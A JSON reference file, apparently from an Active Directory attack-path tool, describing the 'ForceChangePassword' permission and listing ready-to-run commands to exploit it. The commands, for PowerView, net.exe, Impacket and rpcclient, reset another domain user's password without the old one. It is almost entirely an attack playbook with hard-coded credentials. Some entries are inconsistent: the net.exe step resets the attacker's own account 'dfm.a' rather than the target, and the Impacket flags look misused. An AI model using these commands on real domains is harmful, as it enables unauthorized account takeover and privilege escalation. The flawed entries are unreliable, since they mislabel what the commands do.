{
    "ForceChangePassword": {
        "meaning": "This edge indicates that the principal can reset the password of the target user without knowing the current password of that user.",
        "common": "",
        "windows": {
            "PowerView": [
                {
                    "order": 1,
                    "command": "$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force",
                    "description": "Create secure password credential for authentication"
                },
                {
                    "order": 2,
                    "command": "$Cred = New-Object System.Management.Automation.PSCredential('CONTOSO\\dfm.a', $SecPassword)",
                    "description": "Create PSCredential object for domain authentication"
                },
                {
                    "order": 3,
                    "command": "$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force",
                    "description": "Create secure string for new password to set on target user"
                },
                {
                    "order": 4,
                    "command": "Set-DomainUserPassword -Identity andy -AccountPassword $UserPassword -Credential $Cred",
                    "description": "Reset target user password using PowerView"
                }
            ],
            "NetCommand": [
                {
                    "order": 1,
                    "command": "net user dfm.a Password123! /domain",
                    "description": "Reset user password using net.exe (less secure method)"
                }
            ]
        },
        "linux": {
            "Impacket": [
                {
                    "order": 1,
                    "command": "changepasswd.py DOMAIN/USER:PASSWORD@DC_IP -newpass NewPassword123! -altuser target_user",
                    "description": "Change user password using impacket changepasswd"
                }
            ],
            "RPCClient": [
                {
                    "order": 1,
                    "command": "rpcclient -U 'DOMAIN\\user%password' DC_IP -c 'setuserinfo2 target_user 23 newpassword'",
                    "description": "Change user password using rpcclient"
                }
            ]
        }
    }
}
